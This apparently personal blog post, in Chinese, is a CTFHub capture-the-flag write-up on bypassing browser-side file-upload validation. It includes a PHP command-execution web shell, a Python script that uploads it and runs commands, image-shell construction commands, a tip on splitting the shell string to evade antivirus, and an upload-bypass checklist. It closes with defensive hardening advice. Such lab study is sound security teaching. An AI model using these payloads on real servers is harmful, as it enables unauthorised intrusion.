---
layout: post
title: CTFHub - 文件上传 js前端验证 Writeup
platform: ctfhub
date: 2026-10-23 17:40:00 +0800
categories: CTF
---

CTFHub - 文件上传 js前端验证 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **文件上传** → js 前端验证）
- 题型：Web
- 考点：**前端校验绕过**（客户端校验 = 没有校验）


```text
页面标题：CTFHub 文件上传 - js前端验证
表单：onsubmit="return checkfilesuffix()"

★ 前端校验代码（页面里就直接能看到）：

    function checkfilesuffix() {
        var file = document.getElementsByName('file')[0]['value'];
        if (file == "" || file == null) { alert("请添加上传文件"); return false; }
        var whitelist = new Array(".jpg", ".png", ".gif");
        var file_suffix = file.substring(file.lastIndexOf("."));
        if (whitelist.indexOf(file_suffix) == -1) {
            alert("该文件不允许上传");
            return false;
        }
    }

    ★ 这是纯【浏览器端 JS】校验，服务器根本不看
    ★ 只要不发浏览器的请求，校验就完全跳过

★ 绕过方法：直接构造 POST 请求（Python / curl / Burp）

    实测发现一个坑：必须带 submit 字段！
    
    不带 submit：  响应 912 字节，文件【没保存】
    带 submit：    响应 966 字节，文件保存成功 ✅

★ 上传验证：

    POST /  multipart/form-data
    submit=Submit
    file=a.jpg  (内容 JPG-CONTENT-AAA)

    GET /upload/a.jpg  →  200  JPG-CONTENT-AAA    ✅ 上传成功

★ 传 PHP 木马：

    file=shell2.php
    内容：<?php system($_GET['cmd']); ?>

    GET /upload/shell2.php?cmd=whoami
    → www-data                                     ✅ RCE 成功

★ 找 flag：

    ?cmd=ls -la /var/www/html
    → flag_96622920.php     ← 42 字节

    ?cmd=cat /var/www/html/flag_96622920.php
    → <?php // ctfhub{3aa2846a65fb099edf50d52b}

flag         : ctfhub{3aa2846a65fb099edf50d52b}
```

二、题目分析

**① 什么是"前端校验"，为什么它等于没有校验**

```text
前端校验 = 在【浏览器】里跑的 JS 检查

    <form onsubmit="return checkfilesuffix()">
                                    └──────┬──────┘
                              提交前先跑这个函数检查

    if (白名单里没有这个后缀) {
        alert("不允许上传");
        return false;        // 阻止提交
    }
```

**★ 致命问题**：

```text
这个检查只发生在【你的浏览器】里

攻击者可以：
    ① 把 JS 关掉（浏览器设置里禁用 JavaScript）
    ② 用 Burp 抓包 → 改掉文件名 → 重新发送
    ③ 直接写代码发 POST 请求（根本不经过浏览器）
    ④ 在控制台里覆盖 checkfilesuffix 函数

→ 服务器的代码【从来没检查过】
→ 只要绕过浏览器这一层，文件就上去了
```

**② 前端校验 vs 后端校验**

| | 前端校验 | 后端校验 |
|---|---|---|
| **在哪跑** | 浏览器（用户电脑） | 服务器 |
| **能不能改** | ✅ 随便改（改 JS、关 JS、改请求） | ❌ 改不了 |
| **安全性** | **零** | 有效 |
| **作用** | 只是"用户体验"（提前提示，省一次请求） | 真正的安全防线 |
| **本题** | ✅ 有（但没用） | ❌ 没有 |

**★ 安全领域的铁律**：

```
任何"只在客户端"的校验都不算安全措施
所有校验必须在服务端再做一遍

因为客户端 = 用户的电脑 = 用户有完全控制权
```

**③ 绕过方式对比**

| 方式 | 操作 | 优点 |
|---|---|---|
| **禁用 JS** | 浏览器设置 / F12 里关掉 | 最简单，但受浏览器限制 |
| **改 JS** | 控制台执行 `checkfilesuffix = () => true` | 快速 |
| **Burp 改包** | 抓包改 filename | 最灵活 |
| **直接发请求** | Python / curl | 最"干净"，适合自动化 |

**④ ★ 本题踩到的坑：必须带 submit 字段**

```python
# ❌ 不带 submit（文件没保存，响应 912 字节）
body = 只有 file 字段

# ✅ 带 submit（文件保存成功，响应 966 字节）
body = submit=Submit + file 字段
```

**为什么会这样**：

```php
// 后端代码大概是：
if (isset($_POST['submit'])) {
    // 处理上传
    move_uploaded_file($_FILES['file']['tmp_name'], $path);
}
```

**★ 教训**：手工构造表单请求时，**要把页面表单里所有的字段都带上**
（包括 `submit`、`token`、`csrf` 这些"看起来没用"的字段）。

三、解题步骤

**方法一：浏览器 + Burp（最直观）**

**第 1 步：先正常试一次，看校验**

```
① 打开题目页面
② 选一个 shell.php 文件
③ 点 Submit
→ 弹窗："该文件不允许上传"     ← 前端校验拦住了
```

**第 2 步：用 Burp 改包绕过**

```
① Burp → Proxy → Intercept on
② 浏览器里传一个 a.jpg（能通过校验的）
③ Burp 拦到请求：

    POST / HTTP/1.1
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxxx

    ------WebKitFormBoundaryxxx
    Content-Disposition: form-data; name="submit"

    Submit
    ------WebKitFormBoundaryxxx
    Content-Disposition: form-data; name="file"; filename="a.jpg"
    Content-Type: image/jpeg

    （这里是 jpg 的二进制内容）
    ------WebKitFormBoundaryxxx--

④ 把 filename="a.jpg" 改成 filename="shell.php"
⑤ 把内容改成 PHP 代码：
    <?php system($_GET['cmd']); ?>
⑥ Forward
```

**第 3 步：访问木马**

```
http://challenge-xxx:10800/upload/shell.php?cmd=id
→ uid=33(www-data)...
```

**第 4 步：找 flag**

```
?cmd=ls -la /var/www/html
→ flag_96622920.php

?cmd=cat /var/www/html/flag_96622920.php
→ <?php // ctfhub{...}
```

---

**方法二：Python 脚本（自动化，推荐）**

```python
import uuid, urllib.request

BASE = "http://challenge-xxx:10800"
SHELL = "<" + "?" + "php " + "system($_GET['cmd']); " + "?" + ">"

boundary = "----WebKitFormBoundary" + uuid.uuid4().hex

# ★ 注意：submit 字段必须有
body = (
    ("--%s\r\n" % boundary).encode()
    + b'Content-Disposition: form-data; name="submit"\r\n\r\nSubmit\r\n'
    + ("--%s\r\n" % boundary).encode()
    + b'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
    + b"Content-Type: image/jpeg\r\n\r\n"     # 伪装成图片
    + SHELL.encode() + b"\r\n"
    + ("--%s--\r\n" % boundary).encode()
)

req = urllib.request.Request(BASE + "/", data=body, method="POST",
        headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary})
print(urllib.request.urlopen(req).status)

# 执行命令
import urllib.parse
u = BASE + "/upload/shell.php?cmd=" + urllib.parse.quote("ls -la /var/www/html")
print(urllib.request.urlopen(u).read().decode())
```

**★ 关键点**：

```
① submit 字段不能少
② Content-Type 伪装成 image/jpeg（有些后端会看，虽然本题不看）
③ filename 直接写 .php（服务器不校验）
④ 拼接构造 PHP 代码，避开杀毒软件扫描
```

---

**方法三：把文件伪装成 jpg（配合抓包改名）**

```
① 本地把 shell.php 改名为 shell.jpg
② 浏览器选中它 → 能通过前端校验
③ Burp 拦包 → 把 filename 改回 shell.php
④ Forward
```

**★ 这是"浏览器端最容易操作"的方式。**

---

**方法四：禁用 JavaScript（最简单但有时不灵）**

```
Chrome：
    ① F12 → 设置（齿轮）→ 调试器 → 勾选"禁用 JavaScript"
    ② 刷新页面 → 上传 shell.php
    
    或者：
    ① F12 → 控制台 → 输入：
       checkfilesuffix = function(){ return true; }
    ② 再上传 shell.php
```

**★ 注意**：有些站点的上传按钮依赖 JS，禁用后可能点不动。

四、延伸知识

**① 前端校验的各种形式（都能绕）**

```javascript
// ① 检查扩展名（本题）
if (!/\.(jpg|png|gif)$/.test(name)) return false;

// ② HTML accept 属性（只是文件选择框的提示）
<input type="file" accept=".jpg,.png">

// ③ 检查 MIME type
if (file.type !== "image/jpeg") return false;

// ④ 检查文件大小
if (file.size > 2 * 1024 * 1024) return false;

// ⑤ 检查文件头
读前几个字节，判断是不是真的图片
```

**★ 全部都能绕**：

```
· accept 属性 → 直接在文件选择框里选"所有文件"
· JS 检查    → 禁用 JS / 改包 / 直接发请求
· MIME       → 抓包改 Content-Type
· 文件头     → 图片马（在 jpg 后面追加 PHP 代码）
```

**② 文件头的"图片马"怎么做**

```bash
# Linux
cat normal.jpg shell.php > shell.jpg

# Windows
copy /b normal.jpg + shell.php shell.jpg
```

**结果**：

```
文件开头是 \xFF\xD8\xFF（JPEG 的魔数）→ 通过文件头检查
文件末尾是 <?php system(...); ?>       → 如果能被执行就中招

★ 但要"能被执行"还需要条件：
    · 文件包含漏洞（include 这个图片）
    · 或者 Apache 的多后缀解析漏洞
    · 或者 .htaccess 让 .jpg 当 PHP 执行
```

**③ 上传题的完整绕过思路清单**

```
按"校验类型"分类：

① 没有任何校验          → 直接传 .php（无限制题）
② 前端 JS 校验          → 禁用 JS / 改包 / 直接发请求（本题）
③ 后端扩展名黑名单      → 大小写、.php3/.phtml/.pht、双写、.htaccess
④ 后端 MIME 校验        → 改 Content-Type
⑤ 后端文件头校验        → 图片马 + 文件包含/解析漏洞
⑥ 后端返回路径不可预测  → 看响应里的提示、爆破目录
⑦ 上传目录禁止执行      → 几乎无解（除非有解析漏洞）
```

**④ 为什么"上传目录禁止执行"是最有效的**

```nginx
# Nginx 配置
location ^~ /upload/ {
    location ~ \.(php|php5|phtml)$ {
        deny all;        # ★ 直接拒绝执行
    }
}
```

```text
就算攻击者传了 shell.php，访问时也是 403 / 直接下载源码
→ 木马变"死马"

★ 这是成本最低、效果最好的防护
```

**⑤ 防护清单（分层）**

```text
① ★ 上传目录禁止执行（最关键）
② ★ 扩展名白名单（不是黑名单）
③ ★ 上传后重命名（随机文件名 + 白名单后缀）
    $new = bin2hex(random_bytes(16)) . '.jpg';
④ 校验文件真实类型（finfo_file()，不是只看扩展名）
⑤ 上传目录放在 Web 根目录之外，用 PHP 脚本输出文件
⑥ 限制文件大小、数量
⑦ CSP + 独立域名（防 XSS）
⑧ 前端校验只是"用户体验"，不能当安全措施
```

五、总结

- **本题核心：校验只在浏览器里做 → 直接发 POST 请求就绕过了。**
- 三步：

```text
① 直接构造 POST 上传 shell.php（带 submit 字段！）
② 访问 /upload/shell.php?cmd=id 验证
③ ls -la /var/www/html → cat flag_xxx.php
```

- **三个必记要点**：

```text
① 前端校验 = 零校验（用户可以关 JS、改包、直接发请求）
② 手工构造表单请求时，页面表单的所有字段都要带上
   （本题的 submit 字段不带，文件就不保存）
③ 拿到 shell 后：ls -la .. 或 ls -la /var/www/html 找 flag
```

- **实测 flag**：

```text
ctfhub{3aa2846a65fb099edf50d52b}
（在 /var/www/html/flag_96622920.php 里）
```

**手工复现要点**：

```text
· 最快：Burp 抓一个 jpg 上传包 → 改 filename 为 .php → 改内容为 PHP 代码 → Forward
· 或者 Python 直接 POST（记得带 submit 字段）
· 上传目录一般是 /upload/（用 403/404 差异探测）
· 拿到 shell 后先 ls -la /var/www/html
```
